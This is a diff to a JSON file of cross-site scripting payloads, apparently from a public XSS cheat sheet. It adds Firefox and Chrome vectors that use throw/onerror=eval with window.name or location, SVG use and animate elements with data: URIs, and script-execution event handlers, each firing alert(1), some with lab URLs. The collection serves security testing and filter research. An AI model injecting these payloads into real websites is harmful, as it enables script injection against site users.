@@ -240,5 +240,43 @@
     "description": "Embed src and codebase and hash bang in Firefox v140 and below",
     "code": "<embed src=\"#!\nalert(1)\" codebase=javascript:>",
     "browsers": ["firefox"]
+  },
+  {
+    "description": "window.name with onerror and throw on Firefox",
+    "code": "<script>throw onerror=eval,{lineNumber:1,columnNumber:1,fileName:1,message:name}</script>",
+    "browsers": ["firefox"],
+    "url": "https://subdomain1.portswigger-labs.net/xss/xss.php?x=%3Ca+href=%23+onclick=%22window.open(%27https://portswigger-labs.net/xss/xss.php?x=%3Cscript%3Ethrow%20onerror=eval,{lineNumber:1,columnNumber:1,fileName:1,message:name}%3C/script%3E%27,%27+alert(1)%27,%27width=500,height=500%27)%22%3Etest%3C/a%3E#"
+  },
+  {
+    "description": "SVG with onerror, throw and document.URL on Firefox",
+    "code": "<svg onload=\"throw top.onerror=eval,{lineNumber:1,columnNumber:1,fileName:1,message:'/*'+URL}\">",
+    "browsers": ["firefox"],
+    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Csvg%20onload=%22throw%20top.onerror=eval,{lineNumber:1,columnNumber:1,fileName:1,message:%27/*%27%2bURL}%22%3E#*/alert(1)//"
+  },
+  {
+    "description": "body with onerror, throw and location on Firefox",
+    "code": "<body onload=\"throw onerror=eval,{lineNumber:1,columnNumber:1,fileName:1,message:'/*'+location}\">",
+    "browsers": ["firefox"],
+    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cbody%20onload=%22throw%20onerror=eval,{lineNumber:1,columnNumber:1,fileName:1,message:%27/*%27%2blocation}%22%3E#*/alert(1)//"
+  },
+  {
+    "description": "SVG use element Chrome/Firefox",
+    "code": "<svg><use href=\"data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' width='100' height='100'><a xlink:href='javascript:alert(1)'><rect x='0' y='0' width='100' height='100' /></a></svg>#x\"></use></svg>",
+    "browsers": ["chrome", "firefox"]
+  },
+  {
+    "description": "Animate tag with auto executing use element",
+    "code": "<svg><animate xlink:href=\"#x\" attributeName=\"href\" values=\"data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg'&gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x\" /><use id=x />",
+    "browsers": ["chrome", "firefox"]
+  },
+  {
+    "description": "Fires before script is executed",
+    "code": "<x onbeforescriptexecute=alert(1)><script>1</script>",
+    "browsers": ["firefox"]
+  },
+  {
+    "description": "Fires after script is executed",
+    "code": "<x onafterscriptexecute=alert(1)><script>1</script>",
+    "browsers": ["firefox"]
   }
 ]
